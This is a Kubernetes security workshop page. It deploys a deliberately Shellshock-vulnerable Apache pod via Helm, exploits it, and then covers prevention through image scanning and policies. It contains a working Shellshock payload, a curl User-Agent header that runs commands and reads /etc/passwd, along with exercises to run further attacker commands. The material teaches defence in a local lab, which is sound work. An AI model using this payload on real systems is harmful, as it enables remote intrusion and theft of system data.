# Run a compromised pod

In this section we deliberately introduce a container image with a known vulnerability so that you can enjoy the experience of exploiting it!

## Run an Apache server vulnerable to Shellshock

We're using a container with [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)), a vulnerability in `bash` that allows an attacker to remotely execute commands. To make it really easy, we're providing a Helm chart that installs the vulnerable deployment.


!!! danger

    DO NOT RUN THIS IN A REAL CLUSTER!

```
helm install shellshockable https://lizrice.github.io/shellshockable/shellshockable-0.1.0.tgz
```

This will run a deployment with a single pod. It might take a few seconds to pull the image so check that it's up and running (your pod name will be different):

```
kubectl get pods
```

You'll see something like this:
```
NAME                             READY   STATUS    RESTARTS   AGE
shellshockable-d5b7d44b4-9rpzd   1/1     Running   0          70s
```

In a separate terminal window, run port forwarding so we can make curl requests to this pod. This maps localhost port 8081 to the pod's port 80.

```
kubectl port-forward $(kubectl get pods -l app.kubernetes.io/name=shellshockable -o name) 8081:80
```

You can now use curl (or a browser) to view the web service running on this pod. For example, if you open [localhost:8081](localhost:8081) in your web browser, you'll see the Apache2 default welcome page. There is also a [script](https://github.com/lizrice/shellshockable/blob/gh-pages/cgi-bin/shockme.cgi) that will return the words "Regular, expected output" at the address [localhost:8081/cgi-bin/shockme.cgi](localhost:8081/cgi-bin/shockme.cgi).

If you look at the source for the [script](https://github.com/lizrice/shellshockable/blob/gh-pages/cgi-bin/shockme.cgi) you'll see that it's executed using `bash`. This container is using a compromised version of `bash` with the Shellshock vulnerability, that an attacker can exploit to execute commands.

First let's see the regular text is returned if we use `curl` to make the HTTPS request:

```
curl localhost:8081/cgi-bin/shockme.cgi
```

This should show the response `Regular, expected output`

You've seen the web server return content as expected. Now it's time to act like an attacker and exploit the Shellshock vulnerability.

## Exploit the vulnerability

You can exploit Shellshock by passing a User-Agent header on the `curl` request with the `-A` parameter. This gets expanded as an environment variable by `bash`, and because of the Shellshock vulnerability, it can be used to execute arbitrary commands. For example

```
curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /etc/passwd" localhost:8081/cgi-bin/shockme.cgi
```

Instead of running the CGI script as normal, this reponds to the HTTP request with the contents of `/etc/passwd`!

## Preventing this attack

The safest way to prevent this attack is to ensure the vulnerable version of `bash` isn't included in the container image before it's deployed. This is done with [**container image scanning**](scanning.md).

Image scanning can only detect known, published vulnerabilities. You can also limit the likely damage of as-yet-unknown compromises by configuring containers to run more securely and using [**policies**](policies.md) to enforce safer configuration.

## Optional questions and exercises

If you have the time and interest, here are some additional things you might like to think about.

1. Try running some other commands as if you were an attacker! For example, you could
    - find out what environment variables are set
    - see what user ID you're running as
    - explore the contents of the filesystem to see what is available
1. Where does this `/etc/passwd` file come from - the host or the container?
1. What would happen if you mounted files from the host into this container?
1. Take a look at the [Dockerfile](https://github.com/lizrice/shellshockable/blob/master/Dockerfile) that builds the container image used in this example. It deliberately installed an old, vulnerable version of `bash`.
1. Try running a deployment with an up-to-date version of `apache2` without the vulnerability, and check that you can't exploit it in the same way.

